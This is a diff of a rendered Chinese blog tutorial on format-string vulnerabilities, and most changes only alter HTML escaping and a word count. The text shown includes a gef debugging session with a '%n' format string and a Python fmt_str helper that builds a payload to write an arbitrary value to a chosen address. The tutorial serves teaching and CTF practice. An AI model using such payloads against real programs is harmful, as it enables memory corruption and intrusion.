+<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches expressly full string</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">)</span>
 b<span class="token string">'Hello Wor'</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token comment" spellcheck="true"># Matches on full string, drops match</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches on full string, drops match</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
 b<span class="token string">'Hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </blockquote>
 <p>结果如下</p>
@@ -1600,7 +1600,7 @@ Breakpoint 1 at 0xf7deb670: file printf.c, line 28.
 gef➤  c
 Continuing.
 
-Breakpoint 1, __printf (format=0xff958348 "\254\203\225\377", 'a' <repeats 12="" times="">, "%6$n") at printf.c:28
+Breakpoint 1, __printf (format=0xff958348 "\254\203\225\377", 'a' <repeats 12 times>, "%6$n") at printf.c:28
 28    printf.c: No such file or directory.
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
@@ -1612,7 +1612,7 @@ $esp   : 0xff95832c  →  0x080484d7  →  <main+76> add esp, 0x10
 $ebp   : 0xff9583b8  →  0x00000000
 $esi   : 0xf7f54000  →  0x001b1db0
 $edi   : 0xf7f54000  →  0x001b1db0
-$eip   : 0xf7deb670  →  <printf+0> call 0xf7ec1b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7deb670  →  <printf+0> call 0xf7ec1b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -1628,25 +1628,25 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    0xf7deb667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7deb66d                  nop    
    0xf7deb66e                  xchg   ax, ax
- → 0xf7deb670 <printf+0>       call   0xf7ec1b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7ec1b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7ec1b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7ec1b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7ec1b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7ec1b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7ec1b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7deb670 <printf+0>       call   0xf7ec1b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7ec1b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7ec1b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7ec1b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7ec1b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7ec1b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7ec1b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
 ─────────────────────────────────────────────────────────────────── threads ────
 [#0] Id 1, Name: "overflow_1", stopped 0xf7deb670 in __printf (), reason: BREAKPOINT
 ───────────────────────────────────────────────────────────────────── trace ────
-[#0] 0xf7deb670 → __printf(format=0xff958348 "\254\203\225\377", 'a' <repeats 12="" times="">, "%6$n")
+[#0] 0xf7deb670 → __printf(format=0xff958348 "\254\203\225\377", 'a' <repeats 12 times>, "%6$n")
 [#1] 0x80484d7 → main()
 ────────────────────────────────────────────────────────────────────────────────
 gef➤  c
 Continuing.
-[Inferior 1 (process 3817) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></repeats></printf+0></fprintf+23></handle_intel+107></main+76></printf+0></main+76></repeats></code></pre>
+[Inferior 1 (process 3817) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>结果输出modified c，说明c的值的确被修改成了16.</p>
 <h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>首先，我们来考虑一下如何修改data段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。</p>
 <blockquote>
@@ -1721,8 +1721,8 @@ h    对于整数类型，printf期待一个从short提升的int尺寸的整型�
             payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
     prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
     <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>
-        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>
+        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>
+        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>
     <span class="token keyword">return</span> payload    
 
 payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -1773,8 +1773,8 @@ payload <span class="token operator">=</span> fmt_str<span class="token punctuat
             payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
     prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
     <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>
-        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span> <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>
+        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>
+        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span> <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>
     <span class="token keyword">return</span> payload    
 
 <span class="token keyword">def</span> <span class="token function">proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -2343,7 +2343,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">28.5k</span>&nbsp;字
+                class="white-color">27.9k</span>&nbsp;字
             
             
             
